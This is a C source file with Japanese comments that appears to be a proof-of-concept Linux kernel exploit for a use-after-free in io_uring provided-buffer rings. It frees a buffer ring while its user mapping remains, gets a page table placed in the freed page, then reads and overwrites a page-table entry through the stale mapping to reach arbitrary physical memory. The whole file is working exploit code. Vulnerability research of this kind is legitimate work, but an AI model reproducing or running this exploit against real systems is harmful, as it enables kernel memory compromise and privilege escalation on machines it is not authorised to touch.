#include <unistd.h>
#include <err.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <liburing.h>

/** page size */
#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)

/** 2MiB */
#define TWO_MEGA  0x200000

/** 4MiB */
#define FOUR_MEGA 0x400000

/** 4KiB */
#define FOUR_KILO 0x1000

int main() {
    int pid = getpid();
    printf("[+] pid = %d\n", pid);

    // 2MiB の領域を2つ確保
    // 計 4MiB の連続する仮想アドレス空間
    void *addr_1 = (void *)0xdead000000;
    void *addr_2 = (void *)0xdead200000;
    void *two_mega_1 = mmap(
        addr_1,
        TWO_MEGA,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (two_mega_1 == MAP_FAILED) perror("mmap() failed");

    void *two_mega_2 = mmap(
        addr_2,
        TWO_MEGA,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (addr_2 == MAP_FAILED) perror("mmap() failed");

    // io_uring の初期化
    struct io_uring ring;
    io_uring_queue_init(40, &ring, 0);
    printf("[+] uring_fd = %d\n", ring.ring_fd);

    // register buffer ring
    struct io_uring_buf_reg reg = {
        .ring_entries = 1,
        .bgid = 0,
        .flags = IOU_PBUF_RING_MMAP
    };
    io_uring_register_buf_ring(&ring, &reg, 0);

    // ユーザ空間にマップ
    void *pbuf_mapping = mmap(
        NULL,
        FOUR_KILO, 
        PROT_READ | PROT_WRITE,
        MAP_SHARED,
        ring.ring_fd,
        IORING_OFF_PBUF_RING
    );
    if (pbuf_mapping == MAP_FAILED) perror("mmap() failed");
    printf("[+] pbuf mapped at %p\n", pbuf_mapping);

    // ページフォルト: 1 回目
    *(char *)two_mega_1 = 'a';

    // ring 解放
    io_uring_unregister_buf_ring(&ring, reg.bgid);
    
    // ページフォルト: 2 回目
    // PTE が配置される
    *(char *)addr_2 = 'a';
    *((char *)addr_2 + PAGE_SIZE) = 'b';

    // Use-After-Free
    // PTE が配置されているか確認
    printf("[+] at %p: %lx\n", pbuf_mapping, *(unsigned long *)pbuf_mapping);
    printf("[+] at %p: %lx\n", (unsigned long *)pbuf_mapping + 1, *((unsigned long *)pbuf_mapping + 1));

    // PTE 書き換え
    // *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
    *(unsigned long *)pbuf_mapping = 0x80000001822de867;

    // ページ解放
    if (munmap(pbuf_mapping, FOUR_KILO) == -1) perror("munmap() failed");

    getchar();

    // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
    printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));

    // メモリの解放関連
    if (munmap(two_mega_1, FOUR_MEGA) == -1) perror("munmap() failed");
    io_uring_queue_exit(&ring);

    return 0;
}
